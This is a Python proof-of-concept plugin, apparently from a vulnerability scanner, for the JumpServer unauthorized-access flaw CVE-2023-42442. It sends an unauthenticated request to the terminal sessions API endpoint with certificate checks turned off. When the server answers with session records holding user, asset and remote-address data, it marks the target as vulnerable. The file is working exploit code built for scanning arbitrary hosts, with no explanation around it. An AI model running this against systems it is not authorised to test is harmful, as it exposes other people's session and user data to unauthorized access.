#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/C5tjnwIL0Nr3RNOOmuApHA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'JumpServer未授权访问 CVE-2023-42442',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Accept': '*/*',
      'Connection': 'close',
      }
  target = '/api/v1/terminal/sessions/'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=8,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'id.*?user.*?asset.*?user_id.*?remote_addr.*?terminal.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret